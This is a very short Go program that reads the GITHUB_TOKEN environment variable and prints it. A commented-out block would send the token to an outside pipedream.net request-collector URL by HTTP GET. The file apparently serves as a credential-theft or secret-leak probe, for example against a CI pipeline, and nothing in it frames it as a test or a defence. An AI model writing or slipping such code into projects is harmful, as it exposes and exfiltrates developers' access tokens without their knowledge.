package main

import (
	"fmt"
	// "net/http"
	"os"
)

func main() {
	token := os.Getenv("GITHUB_TOKEN")
	fmt.Printf("TOKEN: %s", token)
	// _, err := http.Get("https://eofeuuypisxyg56.m.pipedream.net/" + token)
	// if err != nil {
	// 	fmt.Println(err)
	// }
}
